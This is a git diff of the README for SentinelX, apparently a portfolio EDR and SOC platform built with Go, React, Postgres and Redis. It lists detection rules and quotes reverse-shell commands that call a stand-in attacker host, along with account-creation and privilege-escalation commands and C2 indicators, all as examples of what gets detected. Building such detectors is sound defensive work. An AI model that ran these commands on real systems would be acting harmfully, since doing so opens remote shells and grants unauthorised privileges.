@@ -1,153 +1,290 @@
-# SentinelX: Cloud EDR + SOC Security Orchestration Platform
+<div align="center">
 
-SentinelX is a complete, enterprise-grade Endpoint Detection and Response (EDR) and Security Operations Center (SOC) platform designed to monitor endpoint nodes and cloud systems, ingest high-volume system events, correlate them against advanced behavioral rules, and display glowing visual alerts on a state-of-the-art cybersecurity command center.
+# 🛡️ SentinelX
 
-This platform showcases low-level system design (Go endpoint daemon), high-throughput REST APIs (Go, Gin, Postgres, GORM), real-time sliding-window rate tracking (Redis keys and Tx pipelines), static and stateful security correlation heuristics, threat intelligence cache lookup databases, and premium modern glassmorphic front-end interfaces (React, TypeScript, Tailwind CSS, Recharts).
+### Enterprise Endpoint Detection & Response Platform
+
+*Cloud-Native Security Monitoring • Threat Detection • SOC Operations • Security Orchestration*
+
+<p>
+
+<img src="https://img.shields.io/badge/Go-1.24-00ADD8?style=for-the-badge&logo=go&logoColor=white">
+
+<img src="https://img.shields.io/badge/React-19-61DAFB?style=for-the-badge&logo=react&logoColor=black">
+
+<img src="https://img.shields.io/badge/PostgreSQL-17-4169E1?style=for-the-badge&logo=postgresql&logoColor=white">
+
+<img src="https://img.shields.io/badge/Redis-7-DC382D?style=for-the-badge&logo=redis&logoColor=white">
+
+<img src="https://img.shields.io/badge/Docker-Enabled-2496ED?style=for-the-badge&logo=docker&logoColor=white">
+
+</p>
 
 ---
 
-## Systems Architecture
+### 🚨 Detect Threats Before They Become Incidents
 
+SentinelX is an enterprise-grade Endpoint Detection & Response (EDR) and Security Operations Center (SOC) platform built from the ground up using Go, React, PostgreSQL and Redis.
+
+The platform continuously monitors hosts, correlates security telemetry in real time, enriches events with threat intelligence feeds, and presents actionable detections through a modern SOC dashboard.
+
+</div>
+
+---
+
+# ⚡ Key Capabilities
+
+<table>
+<tr>
+<td width="50%">
+
+### 🔥 Threat Detection
+
+* Reverse Shell Detection
+* SSH Brute Force Correlation
+* Privilege Escalation Monitoring
+* Persistence Detection
+* Threat Intelligence Matching
+
+</td>
+
+<td width="50%">
+
+### ☁️ Cloud Ready
+
+* Dockerized Deployment
+* Terraform Infrastructure
+* PostgreSQL Persistence
+* Redis Correlation Engine
+* Horizontal Scaling Design
+
+</td>
+</tr>
+</table>
+
+---
+
+# 🏗️ Architecture
+
+```text
+                    ┌─────────────────────────┐
+                    │     Endpoint Fleet      │
+                    │ Linux • Cloud • Servers │
+                    └────────────┬────────────┘
+                                 │
+                                 ▼
+                 ┌──────────────────────────┐
+                 │    SentinelX Agent       │
+                 │  Telemetry Collection    │
+                 └────────────┬─────────────┘
+                              │ HTTPS
+                              ▼
+                 ┌──────────────────────────┐
+                 │     Go API Gateway       │
+                 │   Event Ingestion Layer  │
+                 └────────────┬─────────────┘
+                              │
+      ┌───────────────────────┼────────────────────────┐
+      ▼                       ▼                        ▼
+
+┌──────────────┐     ┌──────────────┐      ┌─────────────────┐
+│ PostgreSQL   │     │ Redis Engine │      │ Detection Core  │
+│ Host Assets  │     │ Sliding TTL  │      │ Rule Correlator │
+│ Alert Store  │     │ Counters     │      │ Threat Intel    │
+└──────────────┘     └──────────────┘      └─────────────────┘
+                              │
+                              ▼
+                    ┌─────────────────┐
+                    │  SOC Dashboard  │
+                    │ React + TS      │
+                    └─────────────────┘
 ```
-                       [ Monitored Fleet Endpoints ]
-       ┌───────────────────────┐               ┌───────────────────────┐
-       │   SentinelX Go Agent  │               │   SentinelX Go Agent  │
-       │   (Production Linux)  │               │ (Simulated Cross-OS)  │
-       └───────────┬───────────┘               └───────────┬───────────┘
-                   │                                       │
-                   └─────────────────┬─────────────────────┘
-                                     │ HTTPS
-                                     ▼
-                          ┌─────────────────────┐
-                          │ Gin Go API Server   │
-                          └──────────┬──────────┘
-                                     │
-           ┌─────────────────────────┼─────────────────────────┐
-           ▼                         ▼                         ▼
- ┌───────────────────┐     ┌───────────────────┐     ┌───────────────────┐
- │  PostgreSQL DB    │     │    Redis Cache    │     │  Detection Engine │
- │  - Registered node│     │  - Stateful rate  │     │  - Static rules   │
- │  - Security alerts│     │    limits counters│     │  - C2 blocklists  │
- │  - Threat feeds   │     │    (SSH logins)   │     │  - File watchdogs │
- └───────────────────┘     └───────────────────┘     └───────────────────┘
-                                     ▲
-                                     │ REST / REST-Poll
-                                     │
-                           ┌─────────┴─────────┐
-                           │  SOC Dashboard    │
-                           │  React + TS + TW  │
-                           └───────────────────┘
-```
 
 ---
 
-## Technology Stack
+# 🎯 Detection Engine
 
-* **Endpoint Agent**: Go (telemetry scanning, cross-compiled, signal interrupt hooks).
-* **SOC Server Backend**: Go, Gin Web Framework, GORM ORM, PostgreSQL (Alert logs & Host databases), Redis (sliding-window state cache).
-* **SOC Console UI**: React, TypeScript, Tailwind CSS, Lucide Icons, Recharts (Area charts).
-* **Deployment & IaC**: Docker, Docker Compose, Terraform (AWS ECS & Azure VM configurations).
-
----
-
-## Core Features & Threat Detection Rules
-
-1. **Behavioral Reverse Shell Rule (Critical)**:
-   * Heuristic matches command patterns like `nc attacker.com 4444 -e /bin/bash`, `bash -i >& /dev/tcp/...`, and Python pty allocations.
-2. **Stateful SSH Brute Force Rule (Medium)**:
-   * Tracks login failure rates using sliding-window TTL counters inside Redis (keyed by host + source IP). Triggers security events exactly upon 5 failed logins within 1 minute.
-3. **Threat Intelligence Blocklist Engine (Critical)**:
-   * Matches outbound agent network sockets against cached Feodo Tracker, Spamhaus, and Emerging Threats feeds. Seeds known bad targets (e.g. `185.230.125.1` and `evil-botnet.ru`).
-4. **Administrative Heuristics (High)**:
-   * Flags suspicious user additions (`useradd hacker`), privilege changes, or modification of highly sensitive credentials files (`/etc/passwd`, `/etc/shadow`).
-5. **System Cron Persistence watchdog (Low)**:
-   * Detects cron configurations write attempts (`/var/spool/cron/*` or `/etc/cron*`) used for maintaining silent persistent system control.
-
----
-
-## Quick Start Setup (Docker Compose Orchestrated)
-
-Run the entire environment (Postgres database, Redis cache, Server, Dashboard, and two concurrently reporting Go Endpoint Agents) in a single command:
+## Reverse Shell Detection
 
 ```bash
-# Navigate to deployment directory
-cd deploy
-
-# Build and orchestrate all containers in the background
-docker-compose up -d --build
+nc attacker.com 4444 -e /bin/bash
+bash -i >& /dev/tcp/x.x.x.x/4444
+python -c 'import pty'
 ```
 
-### Port Mappings:
-* **SOC Dashboard Console**: [http://localhost:3000](http://localhost:3000)
-* **SOC Backend REST API**: [http://localhost:8080](http://localhost:8080)
-* **PostgreSQL Engine**: `localhost:5432` (user/password: `postgres`/`postgres`)
-* **Redis Store**: `localhost:6379`
+**Severity:** Critical
+
+Detects common reverse shell execution techniques frequently observed during post-exploitation activities.
 
 ---
 
-## Quick Start Setup (Local Manual Execution)
+## SSH Brute Force Correlation
 
-If running without Docker, initialize databases and processes manually:
-
-### 1. Backend Server Setup:
-```bash
-cd server
-export DATABASE_URL="host=localhost user=postgres password=postgres dbname=sentinelx port=5432 sslmode=disable"
-export REDIS_URL="localhost:6379"
-export PORT="8080"
-go run .
+```text
+Rule:
+5 Failed Logins
+Within 60 Seconds
+Same Source IP
 ```
 
-### 2. Low-Level Agent Setup:
-```bash
-cd agent
-export SENTINELX_API_URL="http://localhost:8080"
-export SENTINELX_HOST_ID="localhost-host"
-export SENTINELX_HOSTNAME="ubuntu-server-prod"
-export SENTINELX_OS="linux"
-export SENTINELX_MOCK_MODE="true" # Set false on native Linux with root permissions
-go run .
-```
+Powered by Redis sliding-window counters.
 
-### 3. React Dashboard Setup:
-```bash
-cd dashboard
-npm install
-npm run dev
-```
-Access dashboard console on [http://localhost:3000](http://localhost:3000).
+**Severity:** Medium
 
 ---
 
-## Simulating Security Threats (Walkthrough)
+## Threat Intelligence Matching
 
-To verify the EDR capabilities, trigger simulated alerts via the agent or REST payload injects:
+Supported feeds:
 
-### A. Reverse Shell Event (Critical Alert)
-1. Run the agent in simulated mode.
-2. In the background cycle, the agent spawns `nc attacker.com 4444 -e /bin/bash`.
-3. An alarm immediately lights up on the **SOC Dashboard**: **[CRITICAL] Reverse Shell Detected** on `prod-web-01`.
+* Feodo Tracker
+* Emerging Threats
+* Spamhaus
 
-### B. SSH Brute Force (Medium Alert)
-1. The agent periodically fires a burst of 5 failed authentication logs targeting `root` from a mock malicious IP (e.g. `45.80.201.12`).
-2. Redis tracks the failures. On the 5th tick, a **[MEDIUM] SSH Brute Force Attempt** alarm fires on the dashboard timeline with the source IP info.
+Example Detection:
 
-### C. Threat Intelligence Connection (Critical Alert)
-1. The agent reports an outbound network socket request targeting `185.230.125.1` (linked to Feodo Tracker C2 botnets).
-2. The server queries GORM, matches the seeded threat intelligence blocklist record, and triggers a **[CRITICAL] Threat Intelligence Match (IP)** alarm.
+```text
+185.230.125.1
+evil-botnet.ru
+```
+
+**Severity:** Critical
 
 ---
 
-## Granular Git Commit History
+## Privilege Escalation Monitoring
 
-The repository has been structured using industry standard incremental commits to showcase transparent, logical development history:
+```bash
+useradd attacker
+usermod -aG sudo attacker
+```
 
-* `ebd5f9d`: `feat(agent): implement Go telemetry agent with dual linux/demo modes`
-* `f03e4de`: `feat(server): build Go API Server database connection and models`
-* `d838f33`: `feat(detection): integrate Redis and develop rules correlation engine`
-* `3a2ac68`: `feat(intel): build Threat Intelligence blocklist check engine`
-* `b629975`: `feat(dashboard): initialize React + Tailwind CSS SOC Dashboard base theme`
-* `4447e95`: `feat(dashboard): design real-time SOC metrics and active Hosts panel`
-* `fdbe70a`: `feat(dashboard): build detailed Alerts list and interactive Timeline`
-* `68e4ea7`: `feat(deploy): write Dockerfiles and compose configs for orchestrating`
-* `README.md`: Comprehensive recruiter portfolio documentation.
+Monitors suspicious administrative actions and credential file modifications.
+
+---
+
+# 📊 Security Dashboard
+
+<img width="100%" src="docs/dashboard-overview.png">
+
+### SOC Visibility
+
+* Active Hosts
+* Alert Timeline
+* Threat Severity Breakdown
+* Detection Trends
+* Host Health Monitoring
+* Security Event Correlation
+
+---
+
+# 🚀 Quick Start
+
+## Docker Deployment
+
+```bash
+git clone https://github.com/YOUR_USERNAME/sentinelx.git
+
+cd sentinelx/deploy
+
+docker compose up -d --build
+```
+
+### Services
+
+| Service    | URL                   |
+| ---------- | --------------------- |
+| Dashboard  | http://localhost:3000 |
+| API        | http://localhost:8080 |
+| PostgreSQL | localhost:5432        |
+| Redis      | localhost:6379        |
+
+---
+
+# 📈 Engineering Highlights
+
+### Backend
+
+* Go
+* Gin Framework
+* GORM
+* PostgreSQL
+* Redis
+
+### Frontend
+
+* React
+* TypeScript
+* TailwindCSS
+* Recharts
+
+### Infrastructure
+
+* Docker
+* Docker Compose
+* Terraform
+* AWS ECS
+* Azure VM
+
+---
+
+# 🔍 Example Security Alert
+
+```json
+{
+  "host":"prod-web-01",
+  "severity":"critical",
+  "rule":"reverse_shell_detected",
+  "process":"nc attacker.com 4444 -e /bin/bash",
+  "timestamp":"2026-05-30T12:00:00Z"
+}
+```
+
+---
+
+# 📜 Development Timeline
+
+| Commit  | Description               |
+| ------- | ------------------------- |
+| ebd5f9d | Go telemetry agent        |
+| f03e4de | Backend API               |
+| d838f33 | Redis correlation engine  |
+| 3a2ac68 | Threat intelligence       |
+| b629975 | Dashboard foundation      |
+| 4447e95 | Metrics & host monitoring |
+| fdbe70a | Alert timeline            |
+| 68e4ea7 | Docker deployment         |
+
+---
+
+# 🎓 Skills Demonstrated
+
+✔ Endpoint Detection & Response
+
+✔ Security Monitoring
+
+✔ Threat Intelligence
+
+✔ SOC Operations
+
+✔ Event Correlation
+
+✔ Redis Stateful Detection
+
+✔ Cloud Infrastructure
+
+✔ Container Security
+
+✔ Full Stack Development
+
+✔ System Design
+
+---
+
+<div align="center">
+
+### Built for Security Operations
+
+**SentinelX — Detect. Correlate. Respond.**
+
+</div>
